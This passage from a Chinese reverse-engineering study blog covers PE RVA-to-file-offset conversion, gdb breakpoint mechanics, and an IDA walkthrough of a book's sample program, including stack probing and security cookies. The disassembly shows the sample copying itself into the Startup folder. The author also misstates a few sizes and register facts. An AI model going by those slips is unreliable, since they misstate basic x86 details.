<p><code>VirtualAddress</code>(不要被名字迷惑):RVA,即虚拟地址空间中相对于映像基址ImageBase的偏移量</p>
<blockquote>
<p>这里一定要区分清楚VirualAddress和VA</p>
<p>VirtualAddress是定义在节头中的成员,实际上表示的是RVA,因为进程不到装载是不知掉其ImageBase在哪里的</p>
<p>VA&#x3D;RVA+ImageBase&#x3D;VirtualAddress+ImageBase</p>
</blockquote>
<p><code>SizeOfRawData</code>:本节区的大小</p>
<p>不管是躺在文件中还是站在内存里,<code>SizeOfRawData</code>大小永远不变,即一个节中间不会随便插入空隙</p>
<p>比如对于data节,</p>
<p><code>PointerToRawData=0x7C00</code></p>
<p><code>ImageBase=0x1000000</code></p>
<p><code>VA=0x1009000=ImageBase+RVA</code>得到<code>VirtualAddress=RVA=0x9000</code></p>
<p>那么对于任意一个节区在虚拟内存中的起始地址,减去其节头中的成员<code>VirtualAddress</code>就得到<code>ImageBase</code>,</p>
<p><strong>假设</strong></p>
<p><code>VA(x),RVA(x)</code>分别表示符号x在虚拟地址空间中的实际地址和相对于<code>ImageBase</code>的偏移量</p>
<p><code>RAW(x)</code>表示符号x在文件中的偏移量</p>
<p>假设<code>section</code>表示任意节</p>
<p><code>section.VirtualAddress</code>表示该节节头中的<code>VirtualAddress</code>成员</p>
<p><code>section.PointerToRawData</code>表示该节节头中的<code>PointerToRawData</code>成员</p>
<p>显然对于节区有</p>
<p><code>RVA(section)=section.VirtualAddress</code></p>
<p><code>RAW(section)=section.PointerToRawData</code></p>
<p>现在考虑对于任意符号<code>x</code>,给定其虚拟地址空间中的实际地址<code>VA(x)</code>,其RVA和<code>RAW</code>怎样计算呢?</p>
<p><code>ImageBase</code>装载后就知道了,因此可以轻松得到<code>RVA(x)=VA(x)-ImageBase</code></p>
<p>由于每个节的<code>RVA(section)=section.VirtualAddress</code>也是已知的,该节的大小<code>section.SizeOfRawData</code>也是已知的,那么可以得到</p>
<p>第i个节(假设节按照地址递增编号0到n)<code>section[i]</code>管理的相对虚拟地址范围是</p>
<p><code>[section.VirtualAddress, section.VirtualAddress+section[i].SizeOfRawData)</code></p>
<p>如果<code>RVA(x)</code>,说明x根本没有落在节区,甚至还没有出PE头,</p>
<p>而前面分析过了,PE头装载进入虚拟内存就是加了一个<code>ImageBase</code>,因此此时<code>RAW(x)=RVA(x)</code></p>
<p>否则,x落在了节区,需要先判断x落在了哪个节,咋判断呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in [0,n]</span><br><span class="line">	if(RVA(x)&gt;=section[i].VirtualAddress &amp;&amp; RVA(x)&lt; section[i].ViritualAddress+section[i].SizeOfRawData)</span><br><span class="line">		then x is located in section[i]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这就好比一层楼高3米,我闭着眼爬楼爬了8米,问我现在的位置?</p>
<p>一楼[0,3),二楼[3,6),三楼[6,9)</p>
<p>8在[6,9)这个范围内,因此我在3楼</p>
</blockquote>
<p>假设根据刚才的算法,已经知道了x落在<code>section[i]</code>,</p>
<p>那么<strong>x相对于该节起始位置的偏移量</strong>就是<code>RVA(x)-section[i].VirtualAddress</code></p>
<p>显然在文件中,x相对于其所在节的偏移量也是这个数,这就好比058班的sjf考数据结构时班内考号是4,换个教室考C++时班内考号还是4</p>
<p>因此得到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RAW(x)-section[i].PointerToRawData=RVA(x)-section[i].VirtualAddress</span><br></pre></td></tr></table></figure>

<p>移项有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RAW(x)=RVA(x)-section[i].VirtualAddress+section[i].PointerToRawData</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这就和权威指南给出的公式很像了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710160314871.png" alt="image-20220710160314871"></p>
</blockquote>
<p><strong>上述过程可以总结为:</strong></p>
<p>1.查x落在哪个节区</p>
<p>2.查x相对于该节区的偏移量</p>
<p>3.节区相对于文件基地址的偏移量+x相对于该节区的偏移量&#x3D;x相对于文件基地址的偏移量</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/07/07/%E8%B0%83%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/07/%E8%B0%83%E8%AF%95/" class="post-title-link" itemprop="url">binarybook-chapter1-调试</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-07-07 20:19:00" itemprop="dateCreated datePublished" datetime="2022-07-07T20:19:00+08:00">2022-07-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-07-09 18:10:26" itemprop="dateModified" datetime="2022-07-09T18:10:26+08:00">2022-07-09</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="binarybook-chapter1-调试"><a href="#binarybook-chapter1-调试" class="headerlink" title="binarybook-chapter1-调试"></a>binarybook-chapter1-调试</h1><p>原来我只会用devc++,调试只会用cout打印变量观察,我就是个傻懒子</p>
<h2 id="调试原理"><a href="#调试原理" class="headerlink" title="调试原理"></a>调试原理</h2><p>以gdb调试器为例,参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/336922639">原来gdb的底层调试原理这么简单 - 知乎 (zhihu.com)</a></p>
<p>大体意思是:</p>
<p>gbd进程会调用fork函数创建一个子进程,该子进程会调用ptrace函数,让父进程gdb进程托管其所有的信号,然后子进程execv需要调试的程序,</p>
<p><img src="https://pic1.zhimg.com/80/v2-e446d2632631895dc401d7899d7e7a24_1440w.jpg" alt="img"></p>
<p>如此该程序将完全处在gdb父进程的掌控之下</p>
<p><img src="https://pic3.zhimg.com/80/v2-27b78b3fc43dda54599d0d116a0b5a86_1440w.jpg" alt="img"></p>
<p>断点的原理:</p>
<p>gbd进程维护一个断点链表,</p>
<p>gdb进程将我们要下断点的指定行保存在断点列表,然后用int 3中断指令替换断点行指令(字节不足则补nop)</p>
<p>当子进程运行到断点处时执行一个int 3指令,操作系统原本应该向该子进程发送一个SIGTRAP指令让其陷入内核,但是这一信号被父进程gdb截胡了</p>
<p>此时子进程中的int 3已经执行过了,eip指向了下一条指令</p>
<p>现在轮到父进程登场了</p>
<p>父进程gdb收到了SIGTRAP指令,发现是子进程的哪一行引起了中断指令,然后去断点链表找到对应行的记录,再给子进程该回去,然后将子进程的eip程序计数器退一步,让子进程重新执行</p>
<p>这么麻烦实现了一个什么功能呢?</p>
<p>子进程会在断点处int 3指令停下等待信号,这就给了父进程趁机读写子进程堆栈和寄存器的机会</p>
<h2 id="IDA-pro静态观察wsample01b-exe"><a href="#IDA-pro静态观察wsample01b-exe" class="headerlink" title="IDA pro静态观察wsample01b.exe"></a>IDA pro静态观察wsample01b.exe</h2><p>例程来自有趣的二进制<a target="_blank" rel="noopener" href="https://github.com/kenjiaiko/binarybook">kenjiaiko&#x2F;binarybook (github.com)</a></p>
<h3 id="winmain函数的行为"><a href="#winmain函数的行为" class="headerlink" title="winmain函数的行为"></a>winmain函数的行为</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00401080 ; int __stdcall wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)</span><br><span class="line">.text:00401080 _wWinMain@16    proc near               ; CODE XREF: ___tmainCRTStartup+153↓p</span><br><span class="line">.text:00401080</span><br><span class="line">.text:00401080 hInstance       = dword ptr  4</span><br><span class="line">.text:00401080 hPrevInstance   = dword ptr  8</span><br><span class="line">.text:00401080 lpCmdLine       = dword ptr  0Ch</span><br><span class="line">.text:00401080 nShowCmd        = dword ptr  10h</span><br><span class="line">.text:00401080</span><br><span class="line">.text:00401080                 call    sub_401000      ; 上来西安调用函数</span><br><span class="line">.text:00401080                                         ;</span><br><span class="line">.text:00401085                 push    0               ; uType   </span><br><span class="line">.text:00401087                 push    offset Caption  ; &quot;MESSAGE&quot;		;Caption在rdata区,offset伪指令取了它的地址</span><br><span class="line">.text:0040108C                 push    offset Text     ; &quot;Copied!&quot;</span><br><span class="line">.text:00401091                 call    ds:GetActiveWindow</span><br><span class="line">.text:00401097                 push    eax             ; hWnd	;eax承载的是GetActiveWindow的返回值,一个窗口句柄,压栈做参数</span><br><span class="line">.text:00401098                 call    ds:MessageBoxW	;调用MessageBoxW,向屏幕显示对话框</span><br><span class="line">.text:0040109E                 xor     eax, eax		;eax置零</span><br><span class="line">.text:004010A0                 retn    10h			;winmain返回值10h</span><br><span class="line">.text:004010A0 _wWinMain@16    endp</span><br></pre></td></tr></table></figure>

<p>暂且不管sub_401000函数干了啥,先看一下后面的win32API干了啥</p>
<blockquote>
<p>GetActiveWindow</p>
<p>该函数可以获得与调用线程的消息队列相关的活动窗口的窗口句柄。</p>
<p>函数原型:<code>HWND GetActiveWindow（VOID）</code></p>
<p>参数：无</p>
<p>返回值：返回值是与调用线程的消息队列相关的活动窗口的句柄。否则，返回值为NULL。</p>
</blockquote>
<p>既然GetActiveWindow不需要参数,那么前面三个push压栈是为谁准备的参数呢?</p>
<p>GetActiveWindow调用前后,在主函数中看栈帧没有变化,从栈顶向栈底还是&amp;Text,&amp;Caption,0</p>
<p>然后又将eax压栈,而eax存放的是GetActiveWindow的返回值,一个窗口句柄(如果失败则为NULL)</p>
<p>现在栈上压了四个参数,下面要调用MessageBoxW了</p>
<blockquote>
<p>函数原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">MessageBoxW</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional] HWND    hWnd,</span></span><br><span class="line"><span class="params">  [in, optional] LPCWSTR lpText,</span></span><br><span class="line"><span class="params">  [in, optional] LPCWSTR lpCaption,</span></span><br><span class="line"><span class="params">  [in]           UINT    uType</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>hWnd:一个窗口句柄</p>
<p>lpText:要在窗口中打印展示的文本</p>
<p>lpCaption:窗口标题</p>
<p>uType:指定对话框的内容和行为</p>
<table>
<thead>
<tr>
<th>宏定义</th>
<th>值</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>MB_OK</strong></td>
<td>0</td>
<td>窗口只有一个OK按钮,默认模式</td>
</tr>
<tr>
<td><strong>MB_OKCANCEL</strong></td>
<td>1</td>
<td>窗口有两个按钮,分别是OK和Cancel</td>
</tr>
<tr>
<td><strong>MB_ABORTRETRYIGNORE</strong></td>
<td>2</td>
<td>窗口有三个按钮,分别是Abort,Retry,Ignore(放弃,重试,忽略)</td>
</tr>
<tr>
<td><strong>MB_YESNOCANCEL</strong></td>
<td>3</td>
<td>窗口有三个按钮,分别是Yes,No,Cancle</td>
</tr>
<tr>
<td><strong>MB_YESNO</strong></td>
<td>4</td>
<td>窗口有两个按钮,Yes,No</td>
</tr>
<tr>
<td><strong>MB_RETRYCANCEL</strong></td>
<td>5</td>
<td>…</td>
</tr>
<tr>
<td><strong>MB_CANCELTRYCONTINUE</strong></td>
<td>6</td>
<td>…</td>
</tr>
<tr>
<td>…</td>
<td>..</td>
<td>…</td>
</tr>
</tbody></table>
<p>还有很多定义好的窗口样式,现在不用管</p>
<p>返回值:int,返回用户点击的按钮号</p>
<table>
<thead>
<tr>
<th>宏定义</th>
<th>按钮号</th>
<th>按钮</th>
</tr>
</thead>
<tbody><tr>
<td><strong>IDOK</strong></td>
<td>1</td>
<td>OK</td>
</tr>
<tr>
<td><strong>IDCANCEL</strong></td>
<td>2</td>
<td>Cancel</td>
</tr>
<tr>
<td><strong>IDABORT</strong></td>
<td>3</td>
<td>Abort</td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>为啥要返回用户点选的按钮号呢?方便程序后续提供用户希望的服务,</p>
<p>比如当用户点选了Ok则确认并提交了一些信息,点选了Cancel则关闭窗口或者取消了一些信息</p>
</blockquote>
<p>例程运行之后的窗口是这样的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707095841614.png" alt="image-20220707095841614"></p>
<p>可以说这个win32窗口啥正事也没干</p>
<h3 id="sub-401000函数的行为"><a href="#sub-401000函数的行为" class="headerlink" title="sub_401000函数的行为"></a>sub_401000函数的行为</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 sub_401000      proc near               ; CODE XREF: wWinMain(x,x,x,x)↓p</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 Filename        = word ptr -2004h</span><br><span class="line">.text:00401000 pszPath         = word ptr -1004h</span><br><span class="line">.text:00401000 var_4           = dword ptr -4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 push    ebp</span><br><span class="line">.text:00401001                 mov     ebp, esp</span><br><span class="line">.text:00401003                 mov     eax, 2004h</span><br><span class="line">.text:00401008                 call    __alloca_probe</span><br><span class="line">.text:0040100D                 mov     eax, ___security_cookie</span><br><span class="line">.text:00401012                 xor     eax, ebp</span><br><span class="line">.text:00401014                 mov     [ebp+var_4], eax</span><br><span class="line">.text:00401017                 push    1000h           ; nSize</span><br><span class="line">.text:0040101C                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:00401022                 push    eax             ; lpFilename</span><br><span class="line">.text:00401023                 push    0               ; hModule</span><br><span class="line">.text:00401025                 call    ds:GetModuleFileNameW</span><br><span class="line">.text:0040102B                 lea     ecx, [ebp+pszPath]</span><br><span class="line">.text:00401031                 push    ecx             ; pszPath</span><br><span class="line">.text:00401032                 push    0               ; dwFlags</span><br><span class="line">.text:00401034                 push    0               ; hToken</span><br><span class="line">.text:00401036                 push    7               ; csidl</span><br><span class="line">.text:00401038                 push    0               ; hwnd</span><br><span class="line">.text:0040103A                 call    ds:SHGetFolderPathW</span><br><span class="line">.text:00401040                 push    offset String2  ; &quot;\\wsample01b.exe&quot;</span><br><span class="line">.text:00401045                 lea     edx, [ebp+pszPath]</span><br><span class="line">.text:0040104B                 push    edx             ; lpString1</span><br><span class="line">.text:0040104C                 call    ds:lstrcatW</span><br><span class="line">.text:00401052                 push    0               ; bFailIfExists</span><br><span class="line">.text:00401054                 lea     eax, [ebp+pszPath]</span><br><span class="line">.text:0040105A                 push    eax             ; lpNewFileName</span><br><span class="line">.text:0040105B                 lea     ecx, [ebp+Filename]</span><br><span class="line">.text:00401061                 push    ecx             ; lpExistingFileName</span><br><span class="line">.text:00401062                 call    ds:CopyFileW</span><br><span class="line">.text:00401068                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:0040106B                 xor     ecx, ebp        ; StackCookie</span><br><span class="line">.text:0040106D                 xor     eax, eax</span><br><span class="line">.text:0040106F                 call    @__security_check_cookie@4 ; __security_check_cookie(x)</span><br><span class="line">.text:00401074                 mov     esp, ebp</span><br><span class="line">.text:00401076                 pop     ebp</span><br><span class="line">.text:00401077                 retn</span><br><span class="line">.text:00401077 sub_401000      endp</span><br></pre></td></tr></table></figure>

<p>这个函数都干了啥呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000                 push    ebp</span><br><span class="line">.text:00401001                 mov     ebp, esp</span><br></pre></td></tr></table></figure>

<p>winmain函数开端,压栈保存调用者的ebp帧指针,ebp用于winmain函数的帧指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00401003                 mov     eax, 2004h</span><br><span class="line">.text:00401008                 call    __alloca_probe</span><br></pre></td></tr></table></figure>

<p>这里调用了一个<code>__alloca_probe</code>函数,上一行往eax寄存器中存放的2004h是函数参数</p>
<p>这个函数干了啥呢?</p>
<h4 id="call-alloca-probe"><a href="#call-alloca-probe" class="headerlink" title="call    __alloca_probe"></a><code>call    __alloca_probe</code></h4><p>理论上函数开端在保存帧指针ebp之后接着就应该esp-xxx,为当前函数开辟栈帧,而在sub_401000中并没有这样的指令,或者说本应该开辟栈空间的指令的地方有一个<code> call    __alloca_probe</code>那么这个函数调用是否就起到了开辟栈空间的作用呢?</p>
<blockquote>
<p><code>__alloca_probe</code></p>
<p>从名字上看,该函数有两部分,一个是allocate,分配,另一个是probe,探针,探针?这个函数上网搜吧,就是找不到一个详细解释</p>
<p>在binary book上,该函数是<code>wsample0._chkstk</code>这个函数就有解释了</p>
<blockquote>
<p>MSDN:</p>
<p>_chkstk Routine</p>
<p>Called by the compiler when you have more than one page of local variables in your function.</p>
<p>_chkstk Routine is a helper routine for the C compiler. For x86 compilers, _chkstk Routine is called when the local variables exceed 4K bytes; for x64 compilers it is 8K.</p>
<p>_chkstk例程:</p>
<p>当函数栈帧大小大于一个内存页时,编译器会调用该函数</p>
<p>该例程是C编译器的补充.对于x86编译器,当局部变量超过4K时调用,对于x64编译器,局部变量超过8k时调用</p>
<p>然而MSDN只是介绍了啥时候调用这个函数,并没有介绍为啥调用,和调用该函数的影响</p>
<p>下面参考了stackoverflow</p>
<blockquote>
<p>Windows pages in extra stack for your thread as it is used. At the end of the stack, there is one guard page mapped as inaccessible memory – if the program accesses it (because it is trying to use more stack than is currently mapped), there’s an access violation. The OS catches the fault, maps in another page of stack at the same address as the old guard page, creates a new guard page just beyond the old one, and resumes from the instruction that caused the violation.</p>
<p>为线程添加额外的windows页.在栈底有一个被操作系统监管的被映射为不可访问内存的页.如果程序视图访问该页(栈空间太小了)就会发生访问冲突.操作系统会捕获该错误,映射到与旧保护页位于同一地址的另一个堆栈页中，在旧保护页之后创建一个新的保护页，然后从导致冲突的指令恢复。</p>
<p>If a function has more than one page of local variables, then the first address it accesses might be more than one page beyond the current end of the stack. Hence it would miss the guard page and trigger an access violation that the OS doesn’t realise is because more stack is needed. If the total stack required is particularly huge, it could perhaps even reach beyond the guard page, beyond the end of the virtual address space assigned to stack, and into memory that’s actually in use for something else.</p>
<p>如果一个函数有多个本地变量页，那么它访问的第一个地址可能是堆栈当前端之外的多个页面。因此它会错过保护页面并触发一个操作系统没有意识到的访问冲突，因为需要更多的堆栈。如果所需的总堆栈特别巨大，它甚至可能超出保护页面，超出分配给堆栈的虚拟地址空间的末尾，进入实际用于其他用途的内存。</p>
<p>So, <code>_chkstk</code> ensures that there is enough space for the local variables. You can imagine that it does this by touching the memory for the local variables at page-sized intervals, in increasing order, to ensure that it doesn’t miss the guard page (so-called “stack probes”). I don’t know whether it actually does that, though, possibly it takes a more direct route and instructs the OS to map in a certain amount of stack. Either way, if the total required is greater than the virtual address space available for stack, then the OS can complain about it instead of doing something undefined.</p>
<p>因此，_ chkstk 确保局部变量有足够的空间。可以想象，它通过按页面大小的间隔访问本地变量的内存来实现这一点，以递增的顺序，确保它不会错过保护页(所谓的“堆栈探测”)。我不知道它是否真的这样做，但是，可能它采取了一个更直接的例程，并指示操作系统映射到一定数量的堆栈。无论哪种方式，如果所需的总空间大于可用于堆栈的虚拟地址空间，那么操作系统可以报告这件事，而不是执行未定义的操作。</p>
</blockquote>
</blockquote>
<p>逆向__alloca_probe函数观察其行为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:004018E0 __alloca_probe  proc near               ; CODE XREF: sub_401000+8↑p</span><br><span class="line">.text:004018E0                 push    ecx		;压栈保存ecx</span><br><span class="line">.text:004018E1                 lea     ecx, [esp+4]	;ecx指向当前栈顶+4位置</span><br><span class="line">.text:004018E5                 sub     ecx, eax		;ecx-eax-&gt;ecx,显然ecx是一个内存地址,比eax要大,这里不会置CF</span><br><span class="line">.text:004018E7                 sbb     eax, eax		;eax-eax-CF-&gt;eax,由于上一步不需要置CF,因此这里eax=0</span><br><span class="line">.text:004018E9                 not     eax			;eax=反eax,即eax这个32位寄存器全置高</span><br><span class="line">.text:004018EB                 and     ecx, eax		;ecx和全1按位与还是ecx</span><br><span class="line">.text:004018ED                 mov     eax, esp		;esp-&gt;eax,eax获得栈顶指针快照</span><br><span class="line">.text:004018EF                 and     eax, 0FFFFF000h	;eax只保留高20位,低12位置0</span><br><span class="line">.text:004018F4</span><br><span class="line">.text:004018F4 cs10:                                   ; CODE XREF: __alloca_probe+29↓j</span><br><span class="line">.text:004018F4                 cmp     ecx, eax			;ecx-eax根据结果置flag</span><br><span class="line">.text:004018F6                 jb      short cs20		;如果ecx&lt;eax则跳转cs20</span><br><span class="line">.text:004018F8                 mov     eax, ecx			;如果ecx&gt;=eax,则eax=ecx</span><br><span class="line">.text:004018FA                 pop     ecx				;尾声,栈顶还给ecx</span><br><span class="line">.text:004018FB                 xchg    eax, esp			;eax和esp交换</span><br><span class="line">.text:004018FC                 mov     eax, [eax]		;</span><br><span class="line">.text:004018FE                 mov     [esp+0], eax</span><br><span class="line">.text:00401901                 retn						;唯一的函数出口</span><br><span class="line">.text:00401902 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401902</span><br><span class="line">.text:00401902 cs20:                                   ; CODE XREF: __alloca_probe+16↑j</span><br><span class="line">;执行到此说明.text:004018F6 处有ecx&lt;eax,于是循环执行下面三行,直到ecx&gt;=eax</span><br><span class="line">.text:00401902                 sub     eax, 1000h		;eax-1000h-&gt;eax	,1000h就是4KB,32位win上一个页框的大小											;栈顶下移4K,eax待会要赋值给esp栈顶指针</span><br><span class="line">.text:00401907                 test    [eax], eax		;蜜汁操作,test运算了一下结果下一行是无条件跳转,运算个寂寞?</span><br><span class="line">.text:00401909                 jmp     short cs10</span><br><span class="line">.text:00401909 __alloca_probe  endp</span><br></pre></td></tr></table></figure>

<blockquote>
<p>该函数用到了很多寄存器,<code>ecx,eax,esp</code>,纯静态分析很容易分析中忘记寄存器中存放的是什么了,这时候可以使用动态调试按步就班地观察</p>
</blockquote>
<p><code>eax</code>在<code>sub_401000</code>中被赋值<code>2004h=8196d=2K</code>然后作为参数传递给<code>__alloca_probe</code>显然这个大小大于一个页框</p>
<p>如果分配大小eax小于一个页框大小4k,则程序相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;size in eax</span><br><span class="line">.text:004018E0                 push    ecx		</span><br><span class="line">.text:004018E1                 lea     ecx, [esp+4]	;ecx=esp+4</span><br><span class="line">.text:004018E5                 sub     ecx, eax		;ecx=esp+4-size</span><br><span class="line">.text:004018F8                 mov     eax, ecx		;eax=ecx=esp+4-size</span><br><span class="line">.text:004018FA                 pop     ecx			</span><br><span class="line">.text:004018FB                 xchg    eax, esp		;esp=eax=esp+4-size while eax=esp</span><br><span class="line">.text:004018FC                 mov     eax, [eax]	;eax指向老栈顶的元素</span><br><span class="line">.text:004018FE                 mov     [esp+0], eax	;老栈顶元素搬运到新栈顶位置</span><br><span class="line">.text:00401901                 retn	</span><br></pre></td></tr></table></figure>

<p>实际上就是把当前栈扩大size,然后将原来栈顶上存放的内容搬到新的栈顶上</p>
<p>当分配大小eax大于一个页框4K,则程序会有额外的循环步骤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401902 cs20:                                   ; CODE XREF: __alloca_probe+16↑j</span><br><span class="line">.text:00401902                 sub     eax, 1000h	;栈上开辟4k空间,eax待会要拷贝给esp</span><br><span class="line">.text:00401907                 test    [eax], eax	;触摸内存,触发缺页异常,让os将虚拟页载入物理页</span><br><span class="line">.text:00401909                 jmp     short cs10	;循环</span><br></pre></td></tr></table></figure>

<p>循环啥时候停止呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:004018F4 cs10:                                   ; CODE XREF: __alloca_probe+29↓j</span><br><span class="line">.text:004018F4                 cmp     ecx, eax			</span><br><span class="line">.text:004018F6                 jb      short cs20		</span><br></pre></td></tr></table></figure>

<p>ecx在最初的时候直接减去size,指向了希望的栈顶,这里就比较eax是否已经越过了希望的栈顶,</p>
<p>当eax首次越过(eax&#x3D;ecx或者eax-ecx&lt;一个页框的大小4k)</p>
<p>此时栈空间足够大了,满足我们的希望了,可以停止循环了</p>
<p>在这里可以看出,x86windows的栈帧大小是<strong>以页框4K为单位进行分配</strong>的.</p>
</blockquote>
<h4 id="mov-eax-security-cookie"><a href="#mov-eax-security-cookie" class="headerlink" title="mov     eax, ___security_cookie"></a><code>mov     eax, ___security_cookie</code></h4><p>这个<code>__security_cookie</code>带着下划线前缀,一看就不是用户写的,这是个啥呢?</p>
<p>从意义上看,安全cookie值,应该是和安全相关</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:00403000 ; Segment permissions: Read/Write</span><br><span class="line">.data:00403000 _data           segment para public &#x27;DATA&#x27; use32</span><br><span class="line">.data:00403000                 assume cs:_data</span><br><span class="line">.data:00403000                 ;org 403000h</span><br><span class="line">.data:00403000 ; uintptr_t __security_cookie</span><br><span class="line">.data:00403000 ___security_cookie dd 0BB40E64Eh        ; DATA XREF: sub_401000+D↑r</span><br></pre></td></tr></table></figure>

<p><code>___security_cookie</code>位于.data段,程序拥有读写该段的权限.该段的段寄存器是<code>cs</code>寄存器</p>
<p><code>dword ___security_cookie=0BB40E64Eh</code>是一个双字类型,相当于一个int,32字节</p>
<p>这就是一个常数啊,为啥要把一个八竿子打不着的常数压栈呢?</p>
<p>在<code>sub_401000</code>尾声伊始,还有有一条涉及<code>security_cookie</code>指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0040106F                 call    @__security_check_cookie@4 ; __security_check_cookie(x)</span><br></pre></td></tr></table></figure>

<p>该条指令调用了一个函数<code>@__security_check_cookie@4</code></p>
<blockquote>
<p><code>@__security_check_cookie@4</code></p>
<p>从汇编符号上看,应该是fastcall调用约定</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220428155346372.png"></p>
<p>本函数只需要一个参数,使用ecx寄存器传递</p>
<p>ecx寄存器传递了啥参数呢?在sub_40100中是这样写的:</p>
